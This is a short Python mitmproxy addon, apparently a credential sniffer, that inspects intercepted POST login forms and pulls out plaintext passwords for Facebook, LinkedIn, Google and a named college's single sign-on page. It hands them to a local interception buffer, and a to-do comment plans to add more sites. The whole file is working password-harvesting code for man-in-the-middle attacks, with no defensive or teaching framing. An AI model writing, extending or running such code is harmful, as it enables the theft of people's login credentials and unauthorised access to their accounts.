import mitmproxy
from mitm_buffer import MITM_Interface

class Get_Pwords:
	'''
		TO DO:
			add more sites
	'''

	def __init__(self):
		self.interface = MITM_Interface()

	def get_facebook(self,form, flow):
		return self.interface.read_traffic("facebook", form['pass']) if form['pass'] and "facebook.com" in flow.request.headers[':authority'] else None

	def get_linkedin(self,form, flow):
		return self.interface.read_traffic("linkedin", form["session_password"]) if "linkedin.com" in flow.request.headers['Host'] and form['session_password'] else None

	def get_google(self, form, flow):
		return self.interface.read_traffic("google", form['Passwd']) if "Passwd" in form and form['Page'] == "PasswordSeparationSignIn" and "google.com" in flow.request.headers[':authority'] else None

	def get_CC(self,form, flow):
		return self.interface.read_traffic("cc_ssi", form['password']) if flow.request.headers['Host'] == "cas.coloradocollege.edu" and form['password'] else None

	def request(self,flow):
		if flow.request.urlencoded_form and flow.request.method == 'POST':
			form = flow.request.urlencoded_form
			try:
				self.get_google(form, flow)
				self.get_CC(form, flow)
				self.get_facebook(form, flow)
				self.get_linkedin(form, flow)
			except KeyError:
				print("error supressed: key not in urlencoded_form")
				pass

def start():
	return Get_Pwords()